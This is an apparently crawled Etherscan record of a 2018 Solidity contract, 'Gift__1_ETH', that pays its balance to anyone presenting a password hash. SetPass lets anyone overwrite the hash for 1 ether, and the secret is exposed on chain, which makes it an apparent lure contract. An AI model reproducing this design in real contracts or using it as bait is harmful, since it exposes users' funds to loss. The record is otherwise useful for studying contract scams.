//token_name	
//token_url	https://etherscan.io//address/0x4876bca6feab4243e4370bddc92f5a8364de9df9#code
//spider_time	2018/07/08 12:48:19
//token_Transactions	7 txns
//token_price	

pragma solidity ^0.4.18;

contract Gift__1_ETH
{
    bool passHasBeenSet = false;
    
    function()payable{}
    
    function GetHash(bytes pass) constant returns (bytes32) {return sha3(pass);}
    
    bytes32 public hashPass;
    
    function SetPass(bytes32 hash)
    public
    payable
    {
        if(!passHasBeenSet&&(msg.value >= 1 ether))
        {
            hashPass = hash;
        }
    }
    
    function GetGift(bytes pass)
    public
    payable
    {
        if(hashPass == sha3(pass))
        {
            msg.sender.transfer(this.balance);
        }
    }
    
    function PassHasBeenSet(bytes32 hash)
    public
    {
        if(hash==hashPass)
        {
           passHasBeenSet=true;
        }
    }
}